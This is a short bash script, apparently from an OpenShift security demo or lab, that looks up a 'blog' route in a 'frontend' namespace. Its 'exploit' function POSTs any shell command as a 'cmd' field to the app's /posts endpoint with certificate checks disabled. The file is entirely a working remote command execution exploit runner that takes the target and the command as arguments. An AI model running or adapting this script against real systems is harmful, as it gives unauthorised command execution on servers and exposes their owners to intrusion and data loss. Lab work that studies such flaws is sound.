export target=$(oc -n frontend get route/blog --output jsonpath={.spec.host} 2>/dev/null)

function exploit(){
    curl -k -X POST -d "cmd=$2" "https://$1"/posts
}

if [ ! -z "$1" ] && [ ! -z "$2" ]
then
  exploit $1 $2
  exit 0
fi

if [ ! -z "$target" ] && [ ! -z "$1" ]
then
  exploit $target $1
  exit 0
fi

if [ ! -z "$target" ] && [ -z "$1" ]
then
  echo  "try: $0 <shell command>"
  exit 1
fi

if [ -z "$target" ] && [ -z "$2" ]
then
  echo  "try: $0 <target_url> <shell command>"
  exit 1
fi
